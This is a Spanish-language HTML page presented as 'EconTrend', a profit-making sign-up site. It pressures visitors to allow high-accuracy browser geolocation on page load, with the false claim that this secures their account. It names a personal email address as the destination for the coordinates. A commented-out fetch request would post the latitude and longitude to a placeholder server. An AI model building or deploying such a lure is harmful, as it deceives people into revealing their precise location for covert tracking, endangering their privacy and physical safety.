<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EconTrend - ¡Continúa Generando Ganancias!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(to right, #4CAF50, #8BC34A); /* Degradado verde */
            color: white;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            max-width: 600px;
            width: 100%;
            color: #333;
        }
        h1 {
            color: #2E7D32; /* Verde oscuro */
            margin-bottom: 25px;
            font-size: 2.5em;
        }
        p {
            margin-bottom: 20px;
            line-height: 1.8;
            font-size: 1.1em;
        }
        .highlight {
            color: #FFC107; /* Amarillo para resaltar */
            font-weight: bold;
        }
        .important-note {
            margin-top: 30px;
            font-size: 0.9em;
            color: #555;
        }
        .message {
            font-weight: bold;
            color: #1A5222; /* Un verde más profundo */
            margin-top: 25px;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>¡Bienvenido a EconTrend!</h1>
        <p>Para <span class="highlight">continuar generando ganancias</span> y completar tu registro con nosotros, necesitamos un paso crucial.</p>
        <p>Por favor, haz clic en <span class="highlight">"Permitir"</span> o <span class="highlight">"Aceptar"</span> cuando tu navegador te solicite acceso a la ubicación. ¡Es fundamental para tu experiencia en EconTrend!</p>
        <p class="message" id="statusMessage">Esperando tu confirmación de permisos...</p>
        <p class="important-note">
            No te preocupes, tus coordenadas no serán visibles en esta página. Son necesarias para asegurar la integridad de tu cuenta y la funcionalidad de EconTrend.
        </p>
    </div>

    <script>
        const emailTo = "juanssebas@hotmail.com"; // Tu correo electrónico para enviar la ubicación (esto requiere un servidor)
        const statusMessageElement = document.getElementById('statusMessage');

        function sendLocationToServer(latitude, longitude) {
            // ESTO ES SOLO UN EJEMPLO DE CÓMO SE ENVIARÍAN LOS DATOS A UN SERVIDOR.
            // Para que esto funcione, necesitas tener un servidor (backend) configurado para
            // recibir esta petición POST y luego enviar el correo electrónico.
            // El JavaScript del navegador NO PUEDE ENVIAR CORREOS DIRECTAMENTE.

            console.log("Preparando para enviar datos a un servidor...");
            console.log(`Datos a enviar: Latitud ${latitude}, Longitud ${longitude}`);
            console.log(`Correo de destino (simulado): ${emailTo}`);

            // EJEMPLO DE CÓDIGO PARA ENVIAR A UN SERVIDOR (necesitarías una URL real de tu servidor)
            /*
            fetch('https://tu-servidor.com/enviar-ubicacion-por-correo', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    latitude: latitude,
                    longitude: longitude,
                    recipientEmail: emailTo, // Podrías enviar el correo de destino al servidor
                    // Puedes añadir aquí un ID de usuario, si lo tuvieras
                }),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Error al enviar la ubicación al servidor.');
                }
                return response.json();
            })
            .then(data => {
                console.log('Respuesta del servidor:', data);
                statusMessageElement.textContent = '¡Gracias! Tu información ha sido procesada con éxito. Ya puedes registrarte.';
            })
            .catch((error) => {
                console.error('Error enviando ubicación al servidor:', error);
                statusMessageElement.textContent = 'Hubo un error al procesar tu ubicación. Por favor, inténtalo de nuevo más tarde.';
            });
            */

            // Mensaje que verá el usuario en esta demostración
            statusMessageElement.textContent = '¡Gracias! Tu información de ubicación ha sido procesada. Pronto podrás continuar con tu registro.';
            console.log("Aviso: Para enviar la ubicación por correo, necesitas un backend que reciba estos datos y envíe el correo.");
        }

        function getLocation() {
            if (navigator.geolocation) {
                statusMessageElement.textContent = 'Solicitando permisos de ubicación...';
                // Opciones para getCurrentPosition:
                // enableHighAccuracy: true intenta usar la ubicación más precisa (GPS)
                // timeout: 10000ms (10 segundos) para esperar por la ubicación
                // maximumAge: 0 asegura que no se use una ubicación en caché
                navigator.geolocation.getCurrentPosition(
                    (position) => { // Función de éxito
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        console.log(`Ubicación obtenida: Latitud ${lat}, Longitud ${lon}`);
                        sendLocationToServer(lat, lon);
                    },
                    (error) => { // Función de error
                        let message = "Hubo un problema con la ubicación.";
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                message = "¡Permiso de ubicación denegado! Necesitamos tu permiso para continuar.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                message = "Información de ubicación no disponible. Intenta de nuevo.";
                                break;
                            case error.TIMEOUT:
                                message = "La solicitud de ubicación ha caducado. Asegúrate de tener una buena conexión.";
                                break;
                            case error.UNKNOWN_ERROR:
                                message = "Ocurrió un error inesperado al obtener la ubicación.";
                                break;
                        }
                        statusMessageElement.textContent = message;
                        console.error("Error de geolocalización:", error);
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                statusMessageElement.textContent = "Tu navegador no soporta la geolocalización.";
                console.error("Geolocalización no soportada.");
            }
        }

        // Inicia el proceso de solicitud de ubicación cuando la página carga
        window.onload = getLocation;
    </script>
</body>
</html>